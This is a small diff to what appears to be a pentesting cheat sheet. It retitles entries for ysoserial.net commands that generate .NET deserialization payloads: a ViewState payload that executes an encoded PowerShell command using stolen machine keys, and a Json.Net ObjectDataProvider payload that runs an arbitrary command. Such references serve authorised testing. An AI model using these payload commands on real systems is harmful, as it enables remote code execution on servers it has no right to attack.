@@ -4,9 +4,9 @@
 
 ### ViewState payload
 
-Generate a ViewState payload with ysoserial.net.
+Generate ViewState payload with Ysoserial.Net.
 
-```cmd title:"Generate ysoserial.net ViewState payload"
+```cmd title:"Ysoserial.Net Generate ViewState Payload"
 ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -EncodedCommand $base64_encoded_command" --path="$asp_file_webroot_relative_path" --apppath="$application_path_webroot_relative" --decryptionalg="3DES" --decryptionkey="$decryption_key" --validationalg="SHA1" --validationkey="$validation_key"
 ```
 <!-- cheat
@@ -21,9 +21,9 @@ var validation_key
 
 ### ObjectDataProvider
 
-Generate a Json.Net ObjectDataProvider payload.
+Generate ObjectDataProvider with Ysoserial.Net.
 
-```cmd title:"Generate Json.Net ObjectDataProvider payload"
+```cmd title:"Ysoserial.Net Generate ObjectDataProvider"
 ysoserial.exe -f "$formatter" -g "$gadget" -o raw -c "$command" -t
 ```
 <!-- cheat
